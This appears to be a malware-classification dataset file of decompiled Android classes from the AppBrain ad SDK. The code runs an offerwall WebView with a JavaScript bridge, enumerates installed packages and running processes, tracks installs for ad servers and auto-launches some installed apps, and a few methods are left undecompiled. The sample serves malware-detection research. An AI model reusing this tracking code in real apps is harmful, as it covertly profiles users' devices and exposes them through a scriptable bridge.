"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ah.code","public final class ah {   public final String a;   public final a b;   public final a c;   public final a d;   public final a e; public static class a {     public final int[] a;     public final int b;     public final int c; public static class C0007a {       private int a;       private int b;       private int c;       private int d;       private C0007a(){       }       C0007a(      byte b){         this();       }       public final C0007a a(      int i){         this.d=i;         return this;       }       public final C0007a a(      int i,      int i2){         this.a=i;         this.b=i2;         return this;       }       public final a a(){         return new a(this,(byte)0);       }       public final C0007a b(      int i){         this.c=i;         return this;       }     }     private a(    C0007a c0007a){       this.a=new int[]{c0007a.a,c0007a.b};       this.b=c0007a.c;       this.c=c0007a.d;     }     a(    C0007a c0007a,    byte b){       this(c0007a);     }   } public static class b {     private a a;     private a b;     private a c;     private a d;     private String e;     private b(){       this.e=null;     }     public b(    byte b){       this();     }     public final b a(    a aVar){       this.a=aVar;       return this;     }     public final b b(    a aVar){       this.b=aVar;       return this;     }     public final b c(    a aVar){       this.c=aVar;       return this;     }     public final b d(    a aVar){       this.d=aVar;       return this;     }   }   private ah(  b bVar){     this.a=bVar.e;     this.b=bVar.a;     this.c=bVar.b;     this.d=bVar.c;     this.e=bVar.d;   }   public ah(  b bVar,  byte b2){     this(bVar);   }   public static a.C0007a a(){     return new a.C0007a((byte)0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ai.code","public final class ai implements AppBrainActivity.a {   private static String i=null;   private static final com.appbrain.f.d j=new com.appbrain.f.d(new com.appbrain.f.b());   protected j.h a=j.h.UNKNOWN_SOURCE;   private WebView b;   private ViewGroup c;   private String d;   private String e;   private final Activity f;   private ProgressDialog g;   private ap h; final class a extends WebChromeClient {     a(){     }     @Override public final boolean onJsAlert(    WebView webView,    String str,    String str2,    JsResult jsResult){       jsResult.confirm();       return true;     }     @Override public final void onProgressChanged(    WebView webView,    int i){       ProgressDialog progressDialog;       if (i > 20 && ai.this.c.getVisibility() != 8) {         ai.this.c.setVisibility(8);       }       if (i > 20 && ai.this.g.isShowing() && (progressDialog=ai.this.g) != null) {         if (progressDialog instanceof Dialog ? progressDialog.isShowing() : true) {           try {             progressDialog.dismiss();           }  catch (          Exception e) {           }         }       }       super.onProgressChanged(webView,i);     }   }   public ai(  Activity activity){     this.f=activity;     this.h=new ac(activity);   }   private String a(  j.f fVar){     boolean z=true;     StringBuilder sb=new StringBuilder();     if (this.d != null) {       sb.append(this.d);       if (this.d.contains(""?"")) {         z=false;       }     }  else {       sb.append(this.e + be.a().a(""offer_url"",""/offerwall/""));     }     if (z) {       sb.append(""?"");     }  else {       sb.append(""&"");     }     byte[] b=j.a(this.h.a(fVar,""ow"")).b();     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     try {       GZIPOutputStream gZIPOutputStream=new GZIPOutputStream(byteArrayOutputStream);       gZIPOutputStream.write(b);       gZIPOutputStream.flush();       gZIPOutputStream.close();     }  catch (    Exception e) {     }     String b2=cmn.t.b(byteArrayOutputStream.toByteArray());     sb.append(""data="");     sb.append(b2);     return sb.toString();   }   public static void a(  String str){     i=str;   }   @Override public final void a(){   }   @Override public final void a(  Bundle bundle){     com.appbrain.c.a(this.f);     this.e=ax.a().e();     this.a=j.h.a(this.f.getIntent().getIntExtra(AdTrackerConstants.SOURCE,-1));     if (be.a().c()) {       this.f.finish();       return;     }     this.f.requestWindowFeature(1);     Activity activity=this.f;     this.b=new WebView(this.f);     ak.a(this.f,this.b);     this.b.setWebChromeClient(new a());     this.b.setWebViewClient(new aj(this));     this.b.setVerticalScrollBarEnabled(true);     this.b.setHorizontalScrollBarEnabled(false);     FrameLayout frameLayout=new FrameLayout(this.f);     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(this.b,new FrameLayout.LayoutParams(-1,-1));     LinearLayout linearLayout=new LinearLayout(this.f);     linearLayout.setOrientation(0);     linearLayout.setGravity(1);     TextView textView=new TextView(this.f);     textView.setText(""Loading..."");     textView.setTextColor(-12303292);     textView.setPadding(10,0,0,0);     textView.setTextSize(18.0f);     int i2=R.attr.progressBarStyleSmall;     if (Build.VERSION.SDK_INT >= 4) {       i2=R.attr.progressBarStyleSmallInverse;     }     ProgressBar progressBar=new ProgressBar(this.f,null,i2);     progressBar.setIndeterminate(true);     linearLayout.addView(progressBar);     linearLayout.addView(textView);     linearLayout.setPadding(20,40,0,0);     this.c=linearLayout;     this.c.setVisibility(8);     this.g=new ProgressDialog(this.f);     this.g.setMessage(""Loading apps..."");     this.g.setIndeterminate(true);     this.g.setCancelable(true);     frameLayout.addView(this.c);     this.d=this.e + be.a().a(""offer_url"",""/offerwall/"");     activity.setContentView(frameLayout);     this.g.show();     j.f.a t=j.f.t();     a.C0006a a2=a.C0006a.a(this.f.getIntent());     t.a(a2.b);     t.b(a2.a);     if (this.a != null && this.a != j.h.UNKNOWN_SOURCE) {       t.a(this.a);     }  else     if (this.a != null) {       t.a(this.a);     }  else {       t.a(j.h.UNKNOWN_SOURCE);     }     int intExtra=this.f.getIntent().getIntExtra(""bt"",-1);     if (intExtra != -1) {       t.c(intExtra);     }     if (this.f.getIntent().hasExtra(""bo"")) {       t.a(this.f.getIntent().getBooleanExtra(""bo"",false));     }     if (i != null) {       t.a(i);       i=null;     }     this.b.loadUrl(a(t.c()));     ax.a().f();   }   @Override public final boolean a(  int i2){     if (i2 != 4 || this.b == null || !this.b.canGoBack()) {       return false;     }     this.b.goBack();     return true;   }   @Override public final void b(){   }   @Override public final void b(  Bundle bundle){   }   @Override public final boolean c(){     return this.a == j.h.SKIPPED_INTERSTITIAL || this.a == j.h.DIRECT;   }   @Override public final void d(){     if (this.b != null) {       this.b.getSettings().setJavaScriptEnabled(false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\aj.code","final class aj extends WebViewClient {   final ai a;   public aj(  ai aiVar){     this.a=aiVar;   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     webView.loadData(""<html><body style='color:#444;'><h2>There was a network error.</h2> Please check your internet connection and <a href=\"""" + str2 + ""\""> click here to try again</a>.</body></html>"",""text/html"",""utf-8"");   }   @Override public final boolean shouldOverrideUrlLoading(  android.webkit.WebView r3,  java.lang.String r4){     throw new UnsupportedOperationException(""Method not decompiled: com.appbrain.a.aj.shouldOverrideUrlLoading(android.webkit.WebView, java.lang.String):boolean"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ak.code","public final class ak {   private static Boolean a=null; static class a implements Proguard.KeepMembers {     final ao a;     private final Activity b;     public a(    Activity activity,    ao aoVar){       this.a=aoVar;       this.b=activity;     }     @JavascriptInterface public void click(){       if (this.a != null) {         ak.a(this.b,this.a);         SharedPreferences d=be.a().d();         SharedPreferences.Editor edit=d.edit();         edit.putInt(""ow_click"",d.getInt(""ow_click"",0) + 1);         cmn.a.a().b(edit);       }     }     @JavascriptInterface public void close(){       this.b.finish();     }     @JavascriptInterface public boolean isPackageInstalled(    String str){       return cmn.q.a(this.b,str);     }     @JavascriptInterface public void openUrl(    String str,    boolean z){       if (z) {         ak.c(this.b,str);       }  else {         ak.a(this.b,str);       }     }     @JavascriptInterface public void reportSelected(    String str,    String str2,    String str3){       new Thread(new am(this,str,str2,str3)).start();       SharedPreferences d=be.a().d();       SharedPreferences.Editor edit=d.edit();       edit.putInt(""ow_imp"",d.getInt(""ow_imp"",0) + 1);       cmn.a.a().b(edit);     }     @JavascriptInterface public void trackClick(    String str,    String str2,    String str3){       ak.a(this.b,str,str2,str3);       SharedPreferences d=be.a().d();       SharedPreferences.Editor edit=d.edit();       edit.putInt(""ow_click"",d.getInt(""ow_click"",0) + 1);       cmn.a.a().b(edit);     }   }   public static int a(  Context context){     HashSet hashSet;     long elapsedRealtime=SystemClock.elapsedRealtime();     int i=Integer.MAX_VALUE;     be a2=be.a();     SharedPreferences d=a2.d();     Map<String,?> all=d.getAll();     boolean equals=a2.a(""run"",""1"").equals(""1"");     HashSet hashSet2=null;     List a3=cmn.q.a(context);     HashSet hashSet3=new HashSet(a3.size());     Iterator it=a3.iterator();     while (it.hasNext()) {       hashSet3.add(((PackageInfo)it.next()).packageName);     }     for (    String str : all.keySet()) {       if (str.startsWith(j.a.CLICK.toString())) {         String string=d.getString(str,null);         if (string != null) {           if (equals && hashSet2 == null) {             HashSet hashSet4=new HashSet();             a(hashSet4,context);             hashSet=hashSet4;           }  else {             hashSet=hashSet2;           }           try {             j.m a4=j.m.a(cmn.t.a(string));             String j=a4.h().j();             int l=a4.l();             String str2=""Processing event "" + j + "" ""+ l+ "" ran ""+ a4.h().w();             boolean contains=hashSet3.contains(j);             j.m.a aVar=null;             if (equals) {               int w=a4.h().w();               if (hashSet.contains(j)) {                 aVar=a4.d();                 aVar.a(aVar.h().d().a(w + 1));               }  else               if (!a4.h().v()) {                 aVar=a4.d();                 aVar.a(aVar.h().d().a(0));               }             }             if (l == 0 && contains) {               if (aVar == null) {                 aVar=a4.d();               }               aVar.a(l + 1);               SharedPreferences.Editor edit=d.edit();               edit.putInt(""ow_inst"",d.getInt(""ow_inst"",0) + 1);               cmn.a.a().b(edit);               a(context,aVar,j.a.INSTALL);               if (a4.h().s().contains(""as=1"")) {                 try {                   if (elapsedRealtime - a4.h().p() < a2.a(""asmd"",900) * 1000) {                     if (hashSet == null) {                       HashSet hashSet5=new HashSet();                       try {                         a(hashSet5,context);                         hashSet=hashSet5;                       }  catch (                      com.appbrain.b.i e) {                         hashSet=hashSet5;                         e=e;                         e.printStackTrace();                         hashSet2=hashSet;                       } catch (                      ParseException e2) {                         hashSet=hashSet5;                         e=e2;                         e.printStackTrace();                         hashSet2=hashSet;                       } catch (                      Throwable th) {                         hashSet=hashSet5;                       }                     }                     if (!hashSet.contains(j)) {                       Intent intent=null;                       try {                         intent=context.getPackageManager().getLaunchIntentForPackage(j);                       }  catch (                      Exception e3) {                       }                       if (intent != null) {                         try {                           intent.addFlags(268435456);                           context.startActivity(intent);                         }  catch (                        Exception e4) {                         }                       }                     }                   }                 }  catch (                Throwable th2) {                 }               }             }  else             if (l == 1 && !contains) {               if (aVar == null) {                 aVar=a4.d();               }               aVar.a(l + 1);               a(context,aVar,j.a.UNINSTALL);             }             int p=(int)((elapsedRealtime - a4.h().p()) / 1000);             int i2=Integer.MAX_VALUE;             if (p < 300) {               i2=30;             }  else             if (p < 900) {               i2=120;             }  else             if (p < 3600) {               i2=AdException.INVALID_REQUEST;             }  else             if (p < 93600) {               i2=1800;             }  else             if (l != 3) {               if (aVar == null) {                 aVar=a4.d();               }               aVar.a(aVar.h().d().a(contains));               aVar.a(3);               a(context,aVar,j.a.FINAL_CHECK);             }             if (aVar != null) {               SharedPreferences.Editor edit2=d.edit();               edit2.putString(j.a.CLICK + j,cmn.t.a(aVar.c().b()));               cmn.a.a().a(edit2);             }             i=Math.min(i,i2);             hashSet2=hashSet;           }  catch (          com.appbrain.b.i e5) {             e=e5;           } catch (          ParseException e6) {             e=e6;           }         }       }  else {         hashSet=hashSet2;       }       hashSet2=hashSet;     }     if (i == Integer.MAX_VALUE) {       return 0;     }     return i;   }   public static void a(  Activity activity,  WebView webView){     SharedPreferences d=be.a().d();     long currentTimeMillis=System.currentTimeMillis();     long j=d.getLong(""last_cache_clear"",0L);     if (j != 0 && currentTimeMillis >= j) {       if (currentTimeMillis > 259200000 + j) {         webView.clearCache(true);       }  else {         currentTimeMillis=j;       }     }     if (currentTimeMillis != j) {       SharedPreferences.Editor edit=d.edit();       edit.putLong(""last_cache_clear"",currentTimeMillis);       cmn.a.a().a(edit);     }     WebSettings settings=webView.getSettings();     settings.setSavePassword(false);     settings.setSaveFormData(false);     settings.setJavaScriptEnabled(true);     settings.setSupportZoom(false);     settings.setBlockNetworkImage(false);     settings.setLoadsImagesAutomatically(true);     settings.setDefaultTextEncodingName(""UTF-8"");     webView.setBackgroundColor(-1);     webView.addJavascriptInterface(new a(activity,null),""adApi"");   }   public static void a(  Context context,  ao aoVar){     a(context,aoVar.a,aoVar.c,aoVar.b);   }   private static void a(  Context context,  j.m.a aVar,  j.a aVar2){     String j=aVar.h().j();     long n=aVar.h().n();     String str=""time="" + (n / 1000) + ""&delta=""+ ((System.currentTimeMillis() - n) / 1000);     j.i.a d=aVar.h().d();     d.a(aVar2);     d.b(SystemClock.elapsedRealtime());     d.a(System.currentTimeMillis());     d.c(str);     j.m.a m=j.m.m();     m.a(false);     m.a(d);     m.a(aVar.l());     au.a(context,aVar2 + j,m.c());   }   public static void a(  Context context,  String str){     if (b(context,str)) {       return;     }     com.appbrain.a.a.a(context,str);   }   public static void a(  Context context,  String str,  String str2,  String str3){     j.a aVar=j.a.CLICK;     j.i.a x=j.i.x();     x.a(str);     x.a(aVar);     x.b(SystemClock.elapsedRealtime());     x.a(System.currentTimeMillis());     x.b(str2);     x.c(str3);     j.m.a m=j.m.m();     m.a(x);     m.a(false);     m.a(0);     au.a(context,j.a.CLICK + str,m.c());     if (b(context)) {       return;     }     au.a(context);   }   private static void a(  Set set,  Context context){     try {       for (      ActivityManager.RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager)context.getSystemService(""activity"")).getRunningAppProcesses()) {         if (runningAppProcessInfo.pkgList != null) {           String[] strArr=runningAppProcessInfo.pkgList;           for (          String str : strArr) {             set.add(str);           }         }       }     }  catch (    Throwable th) {       th.printStackTrace();     }   }   private static synchronized boolean b(  Context context){     boolean booleanValue; synchronized (ak.class) {       if (a == null) {         try {           context.getPackageManager().getReceiverInfo(new ComponentName(context,""com.appspot.swisscodemonkeys.featured.InstallBroadcastReceiver""),0);           a=true;         }  catch (        PackageManager.NameNotFoundException e) {           a=false;         }       }       booleanValue=a.booleanValue();     }     return booleanValue;   }   public static boolean b(  Context context,  String str){     Intent intent=new Intent(""android.intent.action.VIEW"");     if (!(context instanceof Activity)) {       intent.addFlags(268435456);       intent.addFlags(8388608);     }     intent.setData(Uri.parse(str));     try {       for (      ResolveInfo resolveInfo : context.getPackageManager().queryIntentActivities(intent,65536)) {         if (resolveInfo.activityInfo.packageName.equals(""com.android.vending"")) {           intent.setClassName(resolveInfo.activityInfo.packageName,resolveInfo.activityInfo.name);           context.startActivity(intent);           return true;         }       }     }  catch (    Exception e) {     }     if (str.startsWith(""http://"") || str.startsWith(""https://"")) {       return false;     }     try {       Intent intent2=new Intent(""android.intent.action.VIEW"");       intent2.setData(Uri.parse(str));       context.startActivity(intent2);     }  catch (    ActivityNotFoundException e2) {     }     return true;   }   public static boolean b(  String str){     return str.startsWith(""market://"") || str.startsWith(""http://play.google.com"") || str.startsWith(""https://play.google.com"");   }   static void c(  Context context,  String str){     if (b(str)) {       a(context,str);     }  else {       new al(str,context).execute(new Void[0]);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\al.code","public final class al extends AsyncTask {   final String a;   final Context b;   public al(  String str,  Context context){     this.a=str;     this.b=context;   }   private String a(){     boolean b;     int i=0;     String str=this.a;     while (true) {       int i2=i + 1;       if (i >= 5) {         return null;       }       try {         b=ak.b(str);         if (b) {           return str;         }         HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();         httpURLConnection.setInstanceFollowRedirects(false);         if (httpURLConnection.getResponseCode() < 300 || httpURLConnection.getResponseCode() >= 400) {           break;         }         str=httpURLConnection.getHeaderField(""Location"");         i=i2;       }  catch (      Exception e) {         e.printStackTrace();         return null;       }     }     return str;   }   @Override protected final Object doInBackground(  Object[] objArr){     return a();   }   @Override protected final void onPostExecute(  Object obj){     String str=(String)obj;     if (str == null) {       ak.a(this.b,this.a);     }  else {       ak.a(this.b,str);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\am.code","final class am implements Runnable {   final String a;   final String b;   final String c;   final ak.a d;   public am(  ak.a aVar,  String str,  String str2,  String str3){     this.d=aVar;     this.a=str;     this.b=str2;     this.c=str3;   }   @Override public final void run(){     Activity activity;     Activity activity2;     Activity activity3;     j.k.a j=j.k.j();     for (    String str : this.a.split("","")) {       activity3=this.d.b;       if (cmn.q.a(activity3,str)) {         j.b(str);       }     }     for (    String str2 : this.b.split("","")) {       j.a(str2);     }     j.c(this.c);     try {       activity=this.d.b;       a.e a=bd.a(activity).a(j.c());       if (a != null) {         activity2=this.d.b;         an.a(activity2,a.h());       }     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\an.code","public final class an implements com.appbrain.e {   private static com.appbrain.e b=null;   private static com.appbrain.e c=null;   private final SharedPreferences a;   private an(  SharedPreferences sharedPreferences){     this.a=sharedPreferences;   }   public static synchronized com.appbrain.e a(  Context context,  boolean z){     com.appbrain.e eVar; synchronized (an.class) {       eVar=z ? b : c;       if (eVar == null) {         eVar=new an(context.getSharedPreferences(z ? ""ab_pref_int"" : ""ab_pref_ext"",0));         if (z) {           b=eVar;         }  else {           c=eVar;         }       }     }     return eVar;   }   public static void a(  Context context,  a.g gVar){     if ((gVar.m() && gVar.n()) || gVar.j() > 0) {       SharedPreferences sharedPreferences=context.getSharedPreferences(""ab_pref_ext"",0);       SharedPreferences.Editor edit=sharedPreferences.edit();       if (gVar.m() && gVar.n()) {         Iterator<String> it=sharedPreferences.getAll().keySet().iterator();         while (it.hasNext()) {           edit.remove(it.next());         }       }       a(gVar.i(),edit);       cmn.a.a().a(edit);     }     if (!(gVar.k() && gVar.l()) && gVar.h() <= 0) {       return;     }     SharedPreferences sharedPreferences2=context.getSharedPreferences(""ab_pref_int"",0);     SharedPreferences.Editor edit2=sharedPreferences2.edit();     if (gVar.k() && gVar.l()) {       Iterator<String> it2=sharedPreferences2.getAll().keySet().iterator();       while (it2.hasNext()) {         edit2.remove(it2.next());       }     }     a(gVar.g(),edit2);     cmn.a.a().a(edit2);   }   private static void a(  List list,  SharedPreferences.Editor editor){     Iterator it=list.iterator();     while (it.hasNext()) {       a.i iVar=(a.i)it.next();       if (iVar.k() && iVar.l()) {         editor.remove(iVar.h());       }  else {         editor.putString(iVar.h(),iVar.j());       }     }   }   @Override public final String a(  String str){     return a(str,(String)null);   }   @Override public final String a(  String str,  String str2){     return this.a.getString(str,str2);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ao.code","public final class ao {   public String a;   public String b;   public String c; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ap.code","public abstract class ap {   private final s a;   public ap(  Context context){     this.a=new s(context);   }   public static c.a a(  String str,  String str2){     ArrayList arrayList=new ArrayList();     for (    String str3 : str.split("","")) {       arrayList.add(str3 + str2);     }     return new c.a(arrayList);   }   public final a.C0018a.C0019a a(  com.appbrain.b.g gVar,  String str){     m.a d=gVar.d();     a(d,this.a.a());     a.C0018a.C0019a H=a.C0018a.H();     H.a(com.appbrain.b.c.a(d.c().b()));     H.a(str);     return H;   }   public abstract void a(  m.a aVar,  h.a aVar2); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\aq.code","public final class aq implements AppBrainActivity.a {   private Activity a;   public aq(  Activity activity){     this.a=activity;   }   public static boolean a(  aq aqVar,  WebView webView,  String str){     if (aqVar.a.isFinishing()) {       return true;     }     if (!ak.b(aqVar.a,str)) {       return false;     }     webView.stopLoading();     aqVar.a.finish();     return true;   }   @Override public final void a(){   }   @Override public final void a(  Bundle bundle){     this.a.requestWindowFeature(1);     ProgressBar progressBar=new ProgressBar(this.a);     WebView webView=new WebView(this.a);     webView.getSettings().setJavaScriptEnabled(true);     webView.setWebViewClient(new ar(this,progressBar));     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-2,-2);     layoutParams.gravity=17;     this.a.setContentView(webView);     this.a.addContentView(progressBar,layoutParams);     webView.loadUrl(this.a.getIntent().getDataString());   }   @Override public final boolean a(  int i){     return false;   }   @Override public final void b(){   }   @Override public final void b(  Bundle bundle){   }   @Override public final boolean c(){     return true;   }   @Override public final void d(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ar.code","final class ar extends WebViewClient {   final ProgressBar a;   final aq b;   public ar(  aq aqVar,  ProgressBar progressBar){     this.b=aqVar;     this.a=progressBar;   }   @Override public final void onPageFinished(  WebView webView,  String str){     super.onPageFinished(webView,str);     this.a.setVisibility(8);   }   @Override public final void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     super.onPageStarted(webView,str,bitmap);     if (aq.a(this.b,webView,str)) {       return;     }     this.a.setVisibility(0);   }   @Override public final boolean shouldOverrideUrlLoading(  WebView webView,  String str){     return aq.a(this.b,webView,str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\as.code","public abstract class as {   private static String a=""last_check_"";   private static String b=""last_err_"";   private static String c=""errorcount_"";   private final String d;   private final long e;   private final String g;   private final String h;   private final String i;   private final AtomicBoolean f=new AtomicBoolean(false);   private final boolean j=true;   public as(  String str,  long j){     this.g=a + str;     this.h=b + str;     this.i=c + str;     this.d=str;     this.e=j;   }   public void a(  long j,  long j2,  long j3,  SharedPreferences sharedPreferences){     try {       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putLong(this.g,j);       if (j2 > 0) {         edit.putLong(this.h,j2);       }  else {         edit.remove(this.h);       }       if (j3 > 0) {         edit.putLong(this.i,j3);       }  else {         edit.remove(this.i);       }       cmn.a.a().a(edit);     }  catch (    Exception e) {       e.printStackTrace();     }   }   protected SharedPreferences a(  Context context){     return context.getSharedPreferences(""update_check"",0);   }   public abstract void a();   public final boolean b(  Context context){     long currentTimeMillis=System.currentTimeMillis();     if (this.f.compareAndSet(false,true)) {       SharedPreferences a2=a(context);       long j=a2.getLong(this.g,0L);       long j2=a2.getLong(this.h,0L);       long j3=a2.getLong(this.i,0L);       if (j3 > 0 ? ((long)Math.max((double)(j + this.e),((double)j2) + ((Math.pow(1.5d,(double)Math.min(12L,j3)) * 10.0d) * 1000.0d))) <= System.currentTimeMillis() : System.currentTimeMillis() >= j + this.e) {         at atVar=new at(this,context,currentTimeMillis,a2);         if (this.j) {           new Thread(atVar).start();         }  else {           atVar.run();         }         return true;       }       if (a2.getLong(this.g,0L) > 3600000 + currentTimeMillis || a2.getLong(this.h,0L) > currentTimeMillis + 3600000) {         a(0L,0L,0L,a2);       }       this.f.set(false);     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\at.code","public final class at implements Runnable {   final Context a;   final long b;   final SharedPreferences c;   final as d;   public at(  as asVar,  Context context,  long j,  SharedPreferences sharedPreferences){     this.d=asVar;     this.a=context;     this.b=j;     this.c=sharedPreferences;   }   @Override public final void run(){     String str;     String str2;     AtomicBoolean atomicBoolean;     try {       as asVar=this.d;       Context context=this.a;       asVar.a();       this.d.a(this.b,0L,0L,this.c);     }  catch (    Exception e) {       e.printStackTrace();       as asVar2=this.d;       SharedPreferences sharedPreferences=this.c;       str=this.d.g;       long j=sharedPreferences.getLong(str,0L);       long j2=this.b;       SharedPreferences sharedPreferences2=this.c;       str2=this.d.i;       asVar2.a(j,j2,sharedPreferences2.getLong(str2,0L) + 1,this.c);     }     atomicBoolean=this.d.f;     atomicBoolean.set(false);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\au.code","public final class au {   public static void a(  Context context){     Intent intent=new Intent(context,(Class<?>)AppBrainService.class);     intent.setAction(""com.appbrain.CHECK"");     context.startService(intent);   }   public static void a(  Context context,  String str,  j.m mVar){     Intent intent=new Intent(context,(Class<?>)AppBrainService.class);     intent.putExtra(""event"",cmn.t.a(mVar.b()));     intent.putExtra(""key"",str);     context.startService(intent);   }   public static void a(  String str,  String str2){     SharedPreferences d=be.a().d();     if (d.getString(str,null) == null) {       SharedPreferences.Editor edit=d.edit();       edit.putString(str,str2);       cmn.a.a().a(edit);     }   }   public static boolean b(  Context context){     boolean z;     SharedPreferences d=be.a().d();     Map<String,?> all=d.getAll();     SharedPreferences.Editor edit=d.edit();     Iterator<String> it=all.keySet().iterator();     while (true) {       if (!it.hasNext()) {         z=false;         break;       }       String next=it.next();       if (next.startsWith(j.a.CLICK.toString()) || next.startsWith(j.a.INSTALL.toString()) || next.startsWith(j.a.UNINSTALL.toString())|| next.startsWith(j.a.FINAL_CHECK.toString())) {         String string=d.getString(next,null);         if (string != null) {           try {             j.m a=j.m.a(cmn.t.a(string));             boolean z2=((double)System.currentTimeMillis()) > ((double)a.h().n()) + 1.296E8d;             if (!a.j()) {               try {                 if (bd.a(context).a(a.h()) != null) {                   if (a.h().l() != j.a.CLICK || z2) {                     edit.remove(next);                   }  else {                     j.m.a d2=a.d();                     d2.a(true);                     edit.putString(next,cmn.t.a(d2.c().b()));                   }                 }               }  catch (              Exception e) {                 e.printStackTrace();                 z=true;                 break;               }             }  else             if (z2 && (!next.startsWith(j.a.CLICK.toString()) || a.l() == 3)) {               edit.remove(next);             }           }  catch (          Exception e2) {             e2.printStackTrace();             edit.remove(next);           }         }  else {           continue;         }       }     }     cmn.a.a().a(edit);     return !z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\av.code","public final class av extends com.appbrain.f.c {   private static av b=null;   private final ap c;   private av(  Context context,  c.a aVar){     super(context);     this.c=new aw(this,context);     a(aVar);   }   public static synchronized av a(  Context context){     av avVar; synchronized (av.class) {       if (b == null) {         be.a().a(context,false);         b=new av(context,ap.a(be.a().g(),be.a().a(""ppath"",""/api/pb?action="")));       }       avVar=b;     }     return avVar;   }   public final a.e a(  a.k kVar){     byte[] b2=b(kVar,""up"");     if (b2 == null) {       return null;     }     return a.e.a(b2);   }   @Override protected final a.C0018a.C0019a a(  com.appbrain.b.g gVar,  String str){     return this.c.a(gVar,str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\aw.code","public final class aw extends ap {   final av a;   public aw(  av avVar,  Context context){     super(context);     this.a=avVar;   }   @Override public final void a(  m.a aVar,  h.a aVar2){     ((a.k.C0015a)aVar).a(aVar2);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\ax.code","public final class ax implements com.appbrain.b {   private static final ax a=new ax();   private boolean c;   private Activity e;   private final be b=be.a();   private boolean d=true;   private ax(){   }   public static ax a(){     return a;   }   private void a(  Context context,  boolean z,  a.C0006a c0006a){     new Handler(Looper.getMainLooper()).post(new ay(this,context,z,c0006a));   }   private synchronized boolean b(  Context context){     boolean z=true; synchronized (this) {       a(context,false);       if (b(true)) {         a(context,true,a.C0006a.a());       }  else {         g();         z=false;       }     }     return z;   }   private boolean b(  boolean z){     int a2;     boolean z2;     if (!this.b.c() && this.b.i() && (a2=this.b.a(""offerwall"",3)) > 0) {       long max=Math.max(this.b.d().getLong(""last_offer_wall_shown"",0L),this.b.d().getLong(""last_offer_time"",0L));       long currentTimeMillis=System.currentTimeMillis();       if (System.currentTimeMillis() > (a2 * 86400 * 1000) + max) {         if (z) {           SharedPreferences.Editor edit=this.b.d().edit();           edit.putLong(""last_offer_time"",System.currentTimeMillis());           cmn.a.a().a(edit);         }         z2=true;       }  else {         if (max > currentTimeMillis) {           SharedPreferences.Editor edit2=this.b.d().edit();           edit2.putLong(""last_offer_time"",System.currentTimeMillis());           cmn.a.a().a(edit2);         }         z2=false;       }       if (z2) {         return true;       }     }     return false;   }   public final double a(  boolean z){     return Math.max(0.0d,Math.min(1.0d,z ? this.b.a(""bmedsample"",1.0d) : this.b.a(""bsample"",1.0d)));   }   public final void a(  Activity activity){     this.e=activity;   }   public final synchronized void a(  android.content.Context r11,  boolean r12){     throw new UnsupportedOperationException(""Method not decompiled: com.appbrain.a.ax.a(android.content.Context, boolean):void"");   }   @Override public final synchronized boolean a(  Context context){     return b(context);   }   public final synchronized boolean b(){     return this.c;   }   public final boolean c(){     return this.d;   }   public final String d(){     return this.b.a(""adserver"",""http://applift-a.apptornado.com,http://applift-b.apptornado.com"");   }   public final String e(){     return this.b.a(""owserver"",""http://applift-a.apptornado.com"");   }   public final void f(){     SharedPreferences.Editor edit=this.b.d().edit();     edit.putLong(""last_offer_wall_shown"",System.currentTimeMillis());     cmn.a.a().b(edit);   }   public final void g(){     if (this.e != null) {       this.e.finish();     }   } } "
